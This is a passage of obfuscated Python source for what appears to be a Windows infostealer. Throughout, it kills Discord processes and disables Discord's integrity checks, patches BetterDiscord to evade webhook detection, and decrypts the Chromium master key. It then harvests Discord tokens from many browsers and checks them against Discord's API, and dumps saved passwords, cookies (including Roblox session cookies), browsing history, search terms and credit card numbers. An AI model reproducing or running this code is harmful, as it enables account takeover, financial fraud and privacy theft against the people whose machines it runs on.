                O00OOO0O0000OOO00 ['ksch_is_here']="https://github.com/zazaman4000"#line:578
                O00OOO0O0000OOO00 ['auto_start']=False #line:579
                O00OOO0O0000OOO00 ['auto_start_discord']=False #line:580
                O00OOO0O0000OOO00 ['integrity']=False #line:581
                O00OOO0O0000OOO00 ['integrity_allowbetterdiscord']=False #line:582
                O00OOO0O0000OOO00 ['integrity_checkexecutable']=False #line:583
                O00OOO0O0000OOO00 ['integrity_checkhash']=False #line:584
                O00OOO0O0000OOO00 ['integrity_checkmodule']=False #line:585
                O00OOO0O0000OOO00 ['integrity_checkscripts']=False #line:586
                O00OOO0O0000OOO00 ['integrity_checkresource']=False #line:587
                O00OOO0O0000OOO00 ['integrity_redownloadhashes']=False #line:588
                O00OOO0O0000OOO00 ['iterations_iv']=364 #line:589
                O00OOO0O0000OOO00 ['iterations_key']=457 #line:590
                O00OOO0O0000OOO00 ['version']=69420 #line:591
            with open (OOOOO00OO0OO0OOOO ,'w')as OO0O0O0OOOOO00000 :#line:592
                json .dump (O00OOO0O0000OOO00 ,OO0O0O0OOOOO00000 ,indent =2 ,sort_keys =True )#line:593
            with open (OOOOO00OO0OO0OOOO ,'a')as OO0O0O0OOOOO00000 :#line:594
                OO0O0O0OOOOO00000 .write ("\n\n//zazaman4000_is_here | https://github.com/zazaman4000")#line:595
    async def kill_process_id (OOO00000O000000O0 ):#line:597
        O000OO0OOOO0OOOO0 =OOO00000O000000O0 .fetch_conf ('blprggg')#line:598
        for OO00OOO0OOOOOOO0O in ['discord','discordtokenprotector','discordcanary','discorddevelopment','discordptb']:#line:599
            O000OO0OOOO0OOOO0 .append (OO00OOO0OOOOOOO0O )#line:600
        for O0OOO0OOOO0OO00O0 in psutil .process_iter ():#line:601
            if any (O0O0OO0OOO0OOO000 in O0OOO0OOOO0OO00O0 .name ().lower ()for O0O0OO0OOO0OOO000 in O000OO0OOOO0OOOO0 ):#line:602
                try :#line:603
                    O0OOO0OOOO0OO00O0 .kill ()#line:604
                except (psutil .NoSuchProcess ,psutil .AccessDenied ):#line:605
                    pass #line:606
    async def bypass_bttdsc (O0OO0OOO0OO00OO0O ):#line:609
        OOO0O0OOO0O0OOO00 =O0OO0OOO0OO00OO0O .roaming +"\\BetterDiscord\\data\\betterdiscord.asar"#line:610
        if ntpath .exists (OOO0O0OOO0O0OOO00 ):#line:611
            O0OOOOOO00OOO00O0 =O0OO0OOO0OO00OO0O .regex_webhook_dsc #line:612
            with open (OOO0O0OOO0O0OOO00 ,'r',encoding ="cp437",errors ='ignore')as O0OOOO0O0OOOO0000 :#line:613
                OO0O00000O00OO0OO =O0OOOO0O0OOOO0000 .read ()#line:614
                OO0OOOOOO0OOOOO00 =OO0O00000O00OO0OO .replace (O0OOOOOO00OOO00O0 ,'KSCHishere')#line:615
            with open (OOO0O0OOO0O0OOO00 ,'w',newline ='',encoding ="cp437",errors ='ignore')as O0OOOO0O0OOOO0000 :#line:616
                O0OOOO0O0OOOO0000 .write (OO0OOOOOO0OOOOO00 )#line:617
    @extract_try #line:619
    def decrypt_val (OO00O000O0OO000O0 ,O0000O0000OOOO0O0 ,O000O00000O000O0O ):#line:620
        try :#line:621
            O0O0OO0O0OOOO0OOO =O0000O0000OOOO0O0 [3 :15 ]#line:622
            O00O00000OO00O00O =O0000O0000OOOO0O0 [15 :]#line:623
            O0OOO000O00O0O0O0 =AES .new (O000O00000O000O0O ,AES .MODE_GCM ,O0O0OO0O0OOOO0OOO )#line:624
            OO00000O0O00OOOOO =O0OOO000O00O0O0O0 .decrypt (O00O00000OO00O00O )#line:625
            OO00000O0O00OOOOO =OO00000O0O00OOOOO [:-16 ].decode ()#line:626
            return OO00000O0O00OOOOO #line:627
        except Exception :#line:628
            return "Failed to decrypt password"#line:629
    def get_master_key (O00O0OOO0OO0O0000 ,O0O0OOO0OO0O000OO ):#line:631
        with open (O0O0OOO0OO0O000OO ,"r",encoding ="utf-8")as O00OO0OO00OOOO000 :#line:632
            O0OOOO00OOO0OO00O =O00OO0OO00OOOO000 .read ()#line:633
        OO000OOOOO00O000O =json .loads (O0OOOO00OOO0OO00O )#line:634
        OOO00OOO0OO0OO0O0 =base64 .b64decode (OO000OOOOO00O000O ["os_crypt"]["encrypted_key"])#line:635
        OOO00OOO0OO0OO0O0 =OOO00OOO0OO0OO0O0 [5 :]#line:636
        OOO00OOO0OO0OO0O0 =CryptUnprotectData (OOO00OOO0OO0OO0O0 ,None ,None ,None ,0 )[1 ]#line:637
        return OOO00OOO0OO0OO0O0 #line:638
    def steal_token (OOOOOO0O0OOOO0OOO ):#line:640
        OO0OO0O0O0000OOO0 ={'Discord':OOOOOO0O0OOOO0OOO .roaming +'\\discord\\Local Storage\\leveldb\\','Discord Canary':OOOOOO0O0OOOO0OOO .roaming +'\\discordcanary\\Local Storage\\leveldb\\','Lightcord':OOOOOO0O0OOOO0OOO .roaming +'\\Lightcord\\Local Storage\\leveldb\\','Discord PTB':OOOOOO0O0OOOO0OOO .roaming +'\\discordptb\\Local Storage\\leveldb\\','Opera':OOOOOO0O0OOOO0OOO .roaming +'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX':OOOOOO0O0OOOO0OOO .roaming +'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo':OOOOOO0O0OOOO0OOO .appdata +'\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch':OOOOOO0O0OOOO0OOO .appdata +'\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa':OOOOOO0O0OOOO0OOO .appdata +'\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum':OOOOOO0O0OOOO0OOO .appdata +'\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser':OOOOOO0O0OOOO0OOO .appdata +'\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star':OOOOOO0O0OOOO0OOO .appdata +'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik':OOOOOO0O0OOOO0OOO .appdata +'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi':OOOOOO0O0OOOO0OOO .appdata +'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS':OOOOOO0O0OOOO0OOO .appdata +'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome':OOOOOO0O0OOOO0OOO .appdata +'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1':OOOOOO0O0OOOO0OOO .appdata +'\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2':OOOOOO0O0OOOO0OOO .appdata +'\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3':OOOOOO0O0OOOO0OOO .appdata +'\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4':OOOOOO0O0OOOO0OOO .appdata +'\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5':OOOOOO0O0OOOO0OOO .appdata +'\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser':OOOOOO0O0OOOO0OOO .appdata +'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge':OOOOOO0O0OOOO0OOO .appdata +'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\','Uran':OOOOOO0O0OOOO0OOO .appdata +'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex':OOOOOO0O0OOOO0OOO .appdata +'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave':OOOOOO0O0OOOO0OOO .appdata +'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium':OOOOOO0O0OOOO0OOO .appdata +'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}#line:668
        for OOOOOO0OOOOO00OOO ,OO0OOO0O0O0O0O0O0 in OO0OO0O0O0000OOO0 .items ():#line:670
            if not os .path .exists (OO0OOO0O0O0O0O0O0 ):#line:671
                continue #line:672
            OO0OOOOOO0OO0O0OO =OOOOOO0OOOOO00OOO .replace (" ","").lower ()#line:673
            if "cord"in OO0OOO0O0O0O0O0O0 :#line:674
                if os .path .exists (OOOOOO0O0OOOO0OOO .roaming +f'\\{OO0OOOOOO0OO0O0OO}\\Local State'):#line:675
                    for O0O00O0000O000OO0 in os .listdir (OO0OOO0O0O0O0O0O0 ):#line:676
                        if O0O00O0000O000OO0 [-3 :]not in ["log","ldb"]:#line:677
                            continue #line:678
                        for O0OOOOOO00OOO0OOO in [OO0O0OO0OO0O0O000 .strip ()for OO0O0OO0OO0O0O000 in open (f'{OO0OOO0O0O0O0O0O0}\\{O0O00O0000O000OO0}',errors ='ignore').readlines ()if OO0O0OO0OO0O0O000 .strip ()]:#line:679
                            for O000O000O000O000O in re .findall (OOOOOO0O0OOOO0OOO .encrypted_regex ,O0OOOOOO00OOO0OOO ):#line:680
                                try :#line:681
                                    O00O00O0OOOO0OOOO =OOOOOO0O0OOOO0OOO .decrypt_val (base64 .b64decode (O000O000O000O000O .split ('dQw4w9WgXcQ:')[1 ]),OOOOOO0O0OOOO0OOO .get_master_key (OOOOOO0O0OOOO0OOO .roaming +f'\\{OO0OOOOOO0OO0O0OO}\\Local State'))#line:682
                                except ValueError :#line:683
                                    pass #line:684
                                try :#line:685
                                    O00O000OO00000O00 =requests .get (OOOOOO0O0OOOO0OOO .baseurl ,headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type':'application/json','Authorization':O00O00O0OOOO0OOOO })#line:689
                                except Exception :#line:690
                                    pass #line:691
                                if O00O000OO00000O00 .status_code ==200 :#line:692
                                    OO0O0O00000OOOO0O =O00O000OO00000O00 .json ()['id']#line:693
                                    if OO0O0O00000OOOO0O not in OOOOOO0O0OOOO0OOO .zg_id :#line:694
                                        OOOOOO0O0OOOO0OOO .tokens .append (O00O00O0OOOO0OOOO )#line:695
                                        OOOOOO0O0OOOO0OOO .zg_id .append (OO0O0O00000OOOO0O )#line:696
            else :#line:697
                for O0O00O0000O000OO0 in os .listdir (OO0OOO0O0O0O0O0O0 ):#line:698
                    if O0O00O0000O000OO0 [-3 :]not in ["log","ldb"]:#line:699
                        continue #line:700
                    for O0OOOOOO00OOO0OOO in [O0OO0OO0O0OO0000O .strip ()for O0OO0OO0O0OO0000O in open (f'{OO0OOO0O0O0O0O0O0}\\{O0O00O0000O000OO0}',errors ='ignore').readlines ()if O0OO0OO0O0OO0000O .strip ()]:#line:701
                        for O00O00O0OOOO0OOOO in re .findall (OOOOOO0O0OOOO0OOO .regex ,O0OOOOOO00OOO0OOO ):#line:702
                            try :#line:703
                                O00O000OO00000O00 =requests .get (OOOOOO0O0OOOO0OOO .baseurl ,headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type':'application/json','Authorization':O00O00O0OOOO0OOOO })#line:707
                            except Exception :#line:708
                                pass #line:709
                            if O00O000OO00000O00 .status_code ==200 :#line:710
                                OO0O0O00000OOOO0O =O00O000OO00000O00 .json ()['id']#line:711
                                if OO0O0O00000OOOO0O not in OOOOOO0O0OOOO0OOO .zg_id :#line:712
                                    OOOOOO0O0OOOO0OOO .tokens .append (O00O00O0OOOO0OOOO )#line:713
                                    OOOOOO0O0OOOO0OOO .zg_id .append (OO0O0O00000OOOO0O )#line:714
        if os .path .exists (OOOOOO0O0OOOO0OOO .roaming +"\\Mozilla\\Firefox\\Profiles"):#line:716
            for OO0OOO0O0O0O0O0O0 ,_OO0O0O0OO0O0OOO00 ,OOO00OOO00O0OOO0O in os .walk (OOOOOO0O0OOOO0OOO .roaming +"\\Mozilla\\Firefox\\Profiles"):#line:717
                for _O0000O0OOOO0O000O in OOO00OOO00O0OOO0O :#line:718
                    if not _O0000O0OOOO0O000O .endswith ('.sqlite'):#line:719
                        continue #line:720
                    for O0OOOOOO00OOO0OOO in [OO0OO0OOOOOOO0O00 .strip ()for OO0OO0OOOOOOO0O00 in open (f'{OO0OOO0O0O0O0O0O0}\\{_O0000O0OOOO0O000O}',errors ='ignore').readlines ()if OO0OO0OOOOOOO0O00 .strip ()]:#line:721
                        for O00O00O0OOOO0OOOO in re .findall (OOOOOO0O0OOOO0OOO .regex ,O0OOOOOO00OOO0OOO ):#line:722
                            try :#line:723
                                O00O000OO00000O00 =requests .get (OOOOOO0O0OOOO0OOO .baseurl ,headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type':'application/json','Authorization':O00O00O0OOOO0OOOO })#line:727
                            except Exception :#line:728
                                pass #line:729
                            if O00O000OO00000O00 .status_code ==200 :#line:730
                                OO0O0O00000OOOO0O =O00O000OO00000O00 .json ()['id']#line:731
                                if OO0O0O00000OOOO0O not in OOOOOO0O0OOOO0OOO .zg_id :#line:732
                                    OOOOOO0O0OOOO0OOO .tokens .append (O00O00O0OOOO0OOOO )#line:733
                                    OOOOOO0O0OOOO0OOO .zg_id .append (OO0O0O00000OOOO0O )#line:734
    def random_dir_create (OO0O00OOOOO0000OO ,_dir :str or os .PathLike =gettempdir ()):#line:742
        OOOOO0O00OOOO0O0O =''.join (random .SystemRandom ().choice ('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')for _OOO000OO0O0OO000O in range (random .randint (10 ,20 )))#line:743
        O0000OO0OO00OOOO0 =os .path .join (_dir ,OOOOO0O00OOOO0O0O )#line:744
        open (O0000OO0OO00OOOO0 ,"x")#line:745
        return O0000OO0OO00OOOO0 #line:746
    @extract_try #line:749
    def steal_passwords2 (O0O0OO0000OO00OOO ,OOOOOOOO0000OOOO0 :str ,O000000OO0O0O0OOO :str ,O0O00O00O000000O0 :str ):#line:750
        O000000OO0O0O0OOO +='\\'+O0O00O00O000000O0 +'\\Login Data'#line:751
        if not os .path .isfile (O000000OO0O0O0OOO ):#line:752
            return #line:753
        OOO000OO0O000OOO0 =O0O0OO0000OO00OOO .random_dir_create ()#line:755
        copy2 (O000000OO0O0O0OOO ,OOO000OO0O000OOO0 )#line:756
        O0O0OOOOO0OO0O0O0 =sqlite3 .connect (OOO000OO0O000OOO0 )#line:757
        OOO0O0O00O0O0OOOO =O0O0OOOOO0OO0O0O0 .cursor ()#line:758
        with open (os .path .join (O0O0OO0000OO00OOO .dir ,"Browsers","All Passwords.txt"),'a',encoding ="utf-8")as OO0O0000O00OO00OO :#line:759
            for OOO0OO0OOO0000O0O in OOO0O0O00O0O0OOOO .execute ("SELECT origin_url, username_value, password_value FROM logins").fetchall ():#line:760
                O0OOO0000O0000000 ,OO0O0OO0000000O0O ,O0OOO000OO00OO0O0 =OOO0OO0OOO0000O0O #line:761
                O0OOO000OO00OO0O0 =O0O0OO0000OO00OOO .dcrpt_val (O0OOO000OO00OO0O0 ,O0O0OO0000OO00OOO .masterkey )#line:762
                if O0OOO0000O0000000 !="":#line:763
                    OO0O0000O00OO00OO .write (f"URL: {O0OOO0000O0000000}\nID: {OO0O0OO0000000O0O}\nPASSW0RD: {O0OOO000OO00OO0O0}\n\n")#line:764
        OOO0O0O00O0O0OOOO .close ()#line:765
        O0O0OOOOO0OO0O0O0 .close ()#line:766
        os .remove (OOO000OO0O000OOO0 )#line:767
    @extract_try #line:769
    def steal_cookies2 (O000OOOOOOO0000O0 ,O0OOO000OO0O0OOOO :str ,O0O0O0OOOO0OO000O :str ,O0O0OOO000O00000O :str ):#line:770
        O0O0O0OOOO0OO000O +='\\'+O0O0OOO000O00000O +'\\Network\\Cookies'#line:771
        if not os .path .isfile (O0O0O0OOOO0OO000O ):#line:772
            return #line:773
        OO0O0OOO00OO000OO =O000OOOOOOO0000O0 .random_dir_create ()#line:774
        copy2 (O0O0O0OOOO0OO000O ,OO0O0OOO00OO000OO )#line:775
        OO00O00OO0OO0OO0O =sqlite3 .connect (OO0O0OOO00OO000OO )#line:776
        O0OO00000O00OOOO0 =OO00O00OO0OO0OO0O .cursor ()#line:777
        with open (os .path .join (O000OOOOOOO0000O0 .dir ,"Browsers","All Cookies.txt"),'a',encoding ="utf-8")as OO0O00OO0000O00O0 :#line:778
            for OOO000OOOOOOO00O0 in O0OO00000O00OOOO0 .execute ("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall ():#line:779
                OOOO00O000O00O000 ,O0OOO000OO0O0OOOO ,O0O0O0OOOO0OO000O ,O00OOOO00OO0OOOO0 ,O000O00O0OO00OO0O =OOO000OOOOOOO00O0 #line:780
                O0OOO00O0O0OO000O =O000OOOOOOO0000O0 .dcrpt_val (O00OOOO00OO0OOOO0 ,O000OOOOOOO0000O0 .masterkey )#line:781
                if OOOO00O000O00O000 and O0OOO000OO0O0OOOO and O0OOO00O0O0OO000O !="":#line:782
                    OO0O00OO0000O00O0 .write ("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format (OOOO00O000O00O000 ,'FALSE'if O000O00O0OO00OO0O ==0 else 'TRUE',O0O0O0OOOO0OO000O ,'FALSE'if OOOO00O000O00O000 .startswith ('.')else 'TRUE',O000O00O0OO00OO0O ,O0OOO000OO0O0OOOO ,O0OOO00O0O0OO000O ))#line:784
        O0OO00000O00OOOO0 .close ()#line:785
        OO00O00OO0OO0OO0O .close ()#line:786
        os .remove (OO0O0OOO00OO000OO )#line:787
    @extract_try #line:796
    def steal_passwords (OO0O000O00OO00000 ):#line:797
        O00OO0O0O000OO00O =open (ntpath .join (OO0O000O00OO00000 .dir ,'Google','Passwords.txt'),'w',encoding ="cp437",errors ='ignore')#line:798
        for OO0OOOO00OOO0OO00 in os .listdir (OO0O000O00OO00000 .chrmmuserdtt ):#line:799
            if re .match (OO0O000O00OO00000 .chrmrgx ,OO0OOOO00OOO0OO00 ):#line:800
                O0O0O0O00OOOO00O0 =ntpath .join (OO0O000O00OO00000 .chrmmuserdtt ,OO0OOOO00OOO0OO00 ,'Login Data')#line:801
                OO000O0OOO0O0OO0O =OO0O000O00OO00000 .cr34t3_f1lkes ()#line:802
                shutil .copy2 (O0O0O0O00OOOO00O0 ,OO000O0OOO0O0OO0O )#line:804
                O0OO000OO0O0OOO00 =sqlite3 .connect (OO000O0OOO0O0OO0O )#line:805
                OO0OOOO0O0O0O00OO =O0OO000OO0O0OOO00 .cursor ()#line:806
                OO0OOOO0O0O0O00OO .execute ("SELECT action_url, username_value, password_value FROM logins")#line:807
                for OO00OO00O00OOOOOO in OO0OOOO0O0O0O00OO .fetchall ():#line:809
                    O0OO00OO00OOOOOOO =OO00OO00O00OOOOOO [0 ]#line:810
                    OO00O000OOO0OO0OO =OO00OO00O00OOOOOO [1 ]#line:811
                    OOO0O00OO0OOO0OO0 =OO00OO00O00OOOOOO [2 ]#line:812
                    OOOO0OOO0O0O0O0O0 =OO0O000O00OO00000 .dcrpt_val (OOO0O00OO0OOO0OO0 ,OO0O000O00OO00000 .chrome_key )#line:813
                    if O0OO00OO00OOOOOOO !="":#line:814
                        O00OO0O0O000OO00O .write (f"URL: {O0OO00OO00OOOOOOO}\nID: {OO00O000OOO0OO0OO}\nPASSW0RD: {OOOO0OOO0O0O0O0O0}\n\n")#line:815
                OO0OOOO0O0O0O00OO .close ()#line:817
                O0OO000OO0O0OOO00 .close ()#line:818
                os .remove (OO000O0OOO0O0OO0O )#line:819
        O00OO0O0O000OO00O .close ()#line:820
    @extract_try #line:824
    def steal_cookies (OOO00OO00O000O0O0 ):#line:825
        O0O0O0OOOO0O00000 =open (ntpath .join (OOO00OO00O000O0O0 .dir ,'Google','Cookies.txt'),'w',encoding ="cp437",errors ='ignore')#line:826
        for OOOOOOO00O0OOOOO0 in os .listdir (OOO00OO00O000O0O0 .chrmmuserdtt ):#line:827
            if re .match (OOO00OO00O000O0O0 .chrmrgx ,OOOOOOO00O0OOOOO0 ):#line:829
                O000OO0OO00OOOOOO =ntpath .join (OOO00OO00O000O0O0 .chrmmuserdtt ,OOOOOOO00O0OOOOO0 ,'Network','cookies')#line:831
                O0O0000OO00O0O0OO =OOO00OO00O000O0O0 .cr34t3_f1lkes ()#line:832
                shutil .copy2 (O000OO0OO00OOOOOO ,O0O0000OO00O0O0OO )#line:835
                OOO0O0O0000O0O000 =sqlite3 .connect (O0O0000OO00O0O0OO )#line:836
                O00O0OO000OOOOO00 =OOO0O0O0000O0O000 .cursor ()#line:837
                O00O0OO000OOOOO00 .execute ("SELECT host_key, name, encrypted_value from cookies")#line:838
                for O00OOO00OOOOOOO0O in O00O0OO000OOOOO00 .fetchall ():#line:840
                    OO00OOO0O0000000O =O00OOO00OOOOOOO0O [0 ]#line:841
                    O00OOO0000OOO00OO =O00OOO00OOOOOOO0O [1 ]#line:842
                    O000O0OOOOOOOO000 =OOO00OO00O000O0O0 .dcrpt_val (O00OOO00OOOOOOO0O [2 ],OOO00OO00O000O0O0 .chrome_key )#line:843
                    if OO00OOO0O0000000O !="":#line:844
                        O0O0O0OOOO0O00000 .write (f"{OO00OOO0O0000000O}	TRUE"+"		"+f"/FALSE	2597573456	{O00OOO0000OOO00OO}	{O000O0OOOOOOOO000}\n")#line:845
                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'in O000O0OOOOOOOO000 :#line:846
                        OOO00OO00O000O0O0 .robloxcookies .append (O000O0OOOOOOOO000 )#line:847
                O00O0OO000OOOOO00 .close ()#line:849
                OOO0O0O0000O0O000 .close ()#line:850
                os .remove (O0O0000OO00O0O0OO )#line:851
        O0O0O0OOOO0O00000 .close ()#line:852
    def steal_history2 (OO000O0OO0OO0OO00 ,O0000O0O0O0OO0O00 :str ,OOO00OO0OOOO0OOOO :str ,OO00O00O00OO00O00 :str ):#line:854
        OOO00OO0OOOO0OOOO +='\\'+OO00O00O00OO00O00 +'\\History'#line:855
        if not os .path .isfile (OOO00OO0OOOO0OOOO ):#line:856
            return #line:857
        O000OO0OOOOOOO0O0 =OO000O0OO0OO0OO00 .random_dir_create ()#line:858
        copy2 (OOO00OO0OOOO0OOOO ,O000OO0OOOOOOO0O0 )#line:859
        OO0OOOOOOO0O0O000 =sqlite3 .connect (O000OO0OOOOOOO0O0 )#line:860
        OOOOOO0OO0OO00O0O =OO0OOOOOOO0O0O000 .cursor ()#line:861
        with open (os .path .join (OO000O0OO0OO0OO00 .dir ,"Browsers","All History.txt"),'a',encoding ="utf-8")as OO0OO0000OO000OO0 :#line:862
            OOO0OO0OOOO0O000O =[]#line:863
            for OOO00OO00O000000O in OOOOOO0OO0OO00O0O .execute ("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall ():#line:864
                O00OO0O0OO00OOOO0 ,O0O00OOO0000000O0 ,O0OO000OO000OOO00 ,O0OO00O00000O0O00 =OOO00OO00O000000O #line:865
                if O00OO0O0OO00OOOO0 and O0O00OOO0000000O0 and O0OO000OO000OOO00 and O0OO00O00000O0O00 !="":#line:866
                    OOO0OO0OOOO0O000O .append ((O00OO0O0OO00OOOO0 ,O0O00OOO0000000O0 ,O0OO000OO000OOO00 ,O0OO00O00000O0O00 ))#line:867
            OOO0OO0OOOO0O000O .sort (key =lambda OO0O00OOO0O0O00O0 :OO0O00OOO0O0O00O0 [3 ],reverse =True )#line:868
            for OOO000000O000O00O in OOO0OO0OOOO0O000O :#line:869
                OO0OO0000OO000OO0 .write ("Visit Count: {:<6} Title: {:<40}\n".format (OOO000000O000O00O [2 ],OOO000000O000O00O [1 ]))#line:870
        OOOOOO0OO0OO00O0O .close ()#line:871
        OO0OOOOOOO0O0O000 .close ()#line:872
        os .remove (O000OO0OOOOOOO0O0 )#line:873
    def steal_cc2 (O0O0OO0O0O0O000OO ,O0OO0O00000OO00OO :str ,OOO0OO0O0O00O00O0 :str ,O0OO0000O000000O0 :str ):#line:875
        OOO0OO0O0O00O00O0 +='\\'+O0OO0000O000000O0 +'\\Web Data'#line:876
        if not os .path .isfile (OOO0OO0O0O00O00O0 ):#line:877
            return #line:878
        OO0O000OOOO00O00O =O0O0OO0O0O0O000OO .random_dir_create ()#line:879
        copy2 (OOO0OO0O0O00O00O0 ,OO0O000OOOO00O00O )#line:880
        O0O0OOO00O0OOOO0O =sqlite3 .connect (OO0O000OOOO00O00O )#line:881
        O00OO000OO0OO0000 =O0O0OOO00O0OOOO0O .cursor ()#line:882
        with open (os .path .join (O0O0OO0O0O0O000OO .dir ,"Browsers","All Creditcards.txt"),'a',encoding ="utf-8")as O0000OOO0OO00OOOO :#line:883
            for OO00O0OOO0OO000O0 in O00OO000OO0OO0000 .execute ("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall ():#line:884
                O0O0OOOOOOO0OOOOO ,O0OOO0O00OO0OOOOO ,OOOOO00O0O0OOOO00 ,OO000000OO0OOO00O =OO00O0OOO0OO000O0 #line:885
                if O0O0OOOOOOO0OOOOO and OO000000OO0OOO00O !="":#line:886
                    O0000OOO0OO00OOOO .write (f"Name: {O0O0OOOOOOO0OOOOO}   Expiration Month: {O0OOO0O00OO0OOOOO}   Expiration Year: {OOOOO00O0O0OOOO00}   Card Number: {O0O0OO0O0O0O000OO.dcrpt_val(OO000000OO0OOO00O, O0O0OO0O0O0O000OO.masterkey)}\n")#line:888
        O0000OOO0OO00OOOO .close ()#line:889
        O00OO000OO0OO0000 .close ()#line:890
        O0O0OOO00O0OOOO0O .close ()#line:891
        os .remove (OO0O000OOOO00O00O )#line:892
    @extract_try #line:895
    def steal_history (O000OOOOO0O0O0000 ):#line:896
        OO0OOO0OOOOOO00O0 =open (ntpath .join (O000OOOOO0O0O0000 .dir ,'Google','History.txt'),'w',encoding ="cp437",errors ='ignore')#line:897
        def O0OO0O0O00OOOO0OO (OO0OOOOOO00O0OO00 ):#line:899
            OOO0000000OOO0000 =""#line:900
            OO0OOOOOO00O0OO00 .execute ('SELECT title, url, last_visit_time FROM urls')#line:901
            for O0O00O0OOOO000OO0 in OO0OOOOOO00O0OO00 .fetchall ():#line:902
                OOO0000000OOO0000 +=f"Search Title: {O0O00O0OOOO000OO0[0]}\nURL: {O0O00O0OOOO000OO0[1]}\nLAST VISIT TIME: {O000OOOOO0O0O0000.cnverttim(O0O00O0OOOO000OO0[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"#line:903
            return OOO0000000OOO0000 #line:904
        def OOO0O000OO0OO0O00 (OOO0OOO000O0O0O00 ):#line:907
            OOO0OOO000O0O0O00 .execute ('SELECT term FROM keyword_search_terms')#line:908
            OOO00000000O00O00 =""#line:909
            for OO0OO0OOO00OOOO00 in OOO0OOO000O0O0O00 .fetchall ():#line:911
                if OO0OO0OOO00OOOO00 [0 ]!="":#line:912
                    OOO00000000O00O00 +=f"{OO0OO0OOO00OOOO00[0]}\n"#line:913
            return OOO00000000O00O00 #line:915
        for O0OO0O00O00OOOO00 in os .listdir (O000OOOOO0O0O0000 .chrmmuserdtt ):#line:918
            if re .match (O000OOOOO0O0O0000 .chrmrgx ,O0OO0O00O00OOOO00 ):#line:920
                OOOO0OO0OOO0000O0 =ntpath .join (O000OOOOO0O0O0000 .chrmmuserdtt ,O0OO0O00O00OOOO00 ,'History')#line:922
                O0O0O0000O00OO0O0 =O000OOOOO0O0O0000 .cr34t3_f1lkes ()#line:923
                shutil .copy2 (OOOO0OO0OOO0000O0 ,O0O0O0000O00OO0O0 )#line:925
                OO0OO00000000000O =sqlite3 .connect (O0O0O0000O00OO0O0 )#line:926
                O0OO000O00OO0O00O =OO0OO00000000000O .cursor ()#line:927
                O00O0OOO00O000000 =OOO0O000OO0OO0O00 (O0OO000O00OO0O00O )#line:930
                OOOO0OO0O0OOO0O0O =O0OO0O0O00OOOO0OO (O0OO000O00OO0O00O )#line:931
                OO0OOO0OOOOOO00O0 .write (f"{' '*17}SEARCH\n{'-'*50}\n{O00O0OOO00O000000}\n{' '*17}\n\nLinks History\n{'-'*50}\n{OOOO0OO0O0OOO0O0O}")#line:933
                O0OO000O00OO0O00O .close ()#line:935
                OO0OO00000000000O .close ()#line:936
                os .remove (O0O0O0000O00OO0O0 )#line:937
        OO0OOO0OOOOOO00O0 .close ()#line:938
    def natify_matched_tokens (OOO000OOOOO0000OO ):#line:941
        O000O0OOOOOO0O000 =open (OOO000OOOOO0000OO .dir +"\\Discord_Info.txt","w",encoding ="cp437",errors ='ignore')#line:943
        for O0OOOO0OOOO0000OO in OOO000OOOOO0000OO .tokens :#line:945
            OOOO00O0O0OOOO000 =httpx .get (OOO000OOOOO0000OO .dscap1 ,headers =OOO000OOOOO0000OO .g3t_H (O0OOOO0OOOO0000OO )).json ()#line:946
            OO00OO0OOOO000O0O =OOOO00O0O0OOOO000 .get ('username')+'#'+str (OOOO00O0O0OOOO000 .get ("discriminator"))#line:947
            O00O0O0O00000OOOO =""#line:949
            O0O0O00OOO0O00000 =OOOO00O0O0OOOO000 ['flags']#line:950
            if (O0O0O00OOO0O00000 ==1 ):#line:951
                O00O0O0O00000OOOO +="Staff, "#line:952
            if (O0O0O00OOO0O00000 ==2 ):#line:953
                O00O0O0O00000OOOO +="Partner, "#line:954
            if (O0O0O00OOO0O00000 ==4 ):#line:955
                O00O0O0O00000OOOO +="Hypesquad Event, "#line:956
            if (O0O0O00OOO0O00000 ==8 ):#line:957
                O00O0O0O00000OOOO +="Green Bughunter, "#line:958
            if (O0O0O00OOO0O00000 ==64 ):#line:959
